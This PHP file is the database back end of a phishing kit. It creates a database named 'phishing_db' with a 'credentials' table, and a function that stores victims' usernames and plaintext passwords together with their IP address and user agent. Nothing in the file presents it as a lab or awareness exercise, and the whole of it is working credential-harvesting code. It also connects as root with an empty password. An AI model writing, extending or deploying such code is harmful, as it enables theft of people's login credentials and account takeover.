<?php
// Database configuration
$db_host = 'localhost';
$db_user = 'root';     // Default XAMPP username
$db_pass = '';         // Default XAMPP password is empty

// Create connection
$conn = new mysqli($db_host, $db_user, $db_pass);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Create database if not exists
$sql = "CREATE DATABASE IF NOT EXISTS phishing_db";
if ($conn->query($sql) === TRUE) {
    echo "Database created successfully or already exists<br>";
} else {
    die("Error creating database: " . $conn->error);
}

// Select the database
$conn->select_db("phishing_db");

// Create table if not exists
$sql = "CREATE TABLE IF NOT EXISTS credentials (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(255) NOT NULL,
    password VARCHAR(255) NOT NULL,
    ip_address VARCHAR(45) NOT NULL,
    user_agent TEXT NOT NULL,
    timestamp DATETIME NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)";

if ($conn->query($sql) === TRUE) {
    echo "Table created successfully or already exists<br>";
} else {
    die("Error creating table: " . $conn->error);
}

// Function to log credentials
function log_credentials($username, $password, $conn) {
    $ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $timestamp = date('Y-m-d H:i:s');
    
    $stmt = $conn->prepare("INSERT INTO credentials (username, password, ip_address, user_agent, timestamp) VALUES (?, ?, ?, ?, ?)");
    $stmt->bind_param("sssss", $username, $password, $ip, $user_agent, $timestamp);
    
    if ($stmt->execute()) {
        return true;
    } else {
        error_log("Error logging credentials: " . $stmt->error);
        return false;
    }
    $stmt->close();
}
?>
